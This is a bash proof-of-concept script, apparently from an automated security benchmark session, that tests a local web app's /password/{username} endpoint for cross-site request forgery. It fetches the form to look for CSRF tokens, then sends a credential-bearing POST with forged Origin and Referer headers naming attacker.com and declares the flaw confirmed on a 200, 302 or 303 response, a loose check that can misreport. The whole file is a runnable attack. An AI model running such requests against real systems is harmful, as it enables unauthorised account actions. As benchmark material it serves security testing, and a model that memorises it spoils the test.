#!/bin/bash
# POC: Demonstrates CSRF vulnerability on /password/{username} endpoint by submitting a POST request with attacker-controlled Origin/Referer headers without any CSRF token validation
# Target: ./repo
# Created: 2025-11-04T17:32:39.484Z
# Session: benchmark-XBEN-027-24-mhku77j0

# CSRF Attack POC on /password/{username} endpoint
# This script demonstrates that the endpoint accepts POST requests from arbitrary origins
# without CSRF token validation

TARGET_HOST="${1:-localhost:8080}"
TARGET_URL="http://${TARGET_HOST}/password/test"
USERNAME="test"
USER_ID="10032"
PASSWORD="test"

echo "[*] CSRF Vulnerability POC: Password Authentication Endpoint"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Check if endpoint returns form without CSRF token
echo "[*] Step 1: Fetching the password form to check for CSRF tokens..."
FORM_RESPONSE=$(curl -s -X GET "http://${TARGET_HOST}/password/${USERNAME}")

if echo "$FORM_RESPONSE" | grep -q "csrf" || echo "$FORM_RESPONSE" | grep -q "_token" || echo "$FORM_RESPONSE" | grep -q "authenticity_token"; then
    echo "[-] CSRF token found in form - basic CSRF protection may be present"
else
    echo "[+] No CSRF token found in form HTML"
fi

echo ""

# Step 2: Attempt CSRF attack with attacker-controlled origin
echo "[*] Step 2: Attempting CSRF attack from attacker.com origin..."
echo ""

CSRF_RESPONSE=$(curl -s -i -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: http://attacker.com" \
  -H "Origin: http://attacker.com" \
  -d "username=${USERNAME}&user_id=${USER_ID}&password=${PASSWORD}" 2>&1)

echo "$CSRF_RESPONSE"
echo ""

# Step 3: Check response code
if echo "$CSRF_RESPONSE" | grep -q "200\|302\|303"; then
    echo "[+] CSRF Vulnerability Confirmed!"
    echo "[+] Endpoint accepted POST request from attacker.com origin"
    echo "[+] No CSRF token validation performed"
    exit 0
else
    echo "[-] Unexpected response, CSRF protection may be present"
    exit 1
fi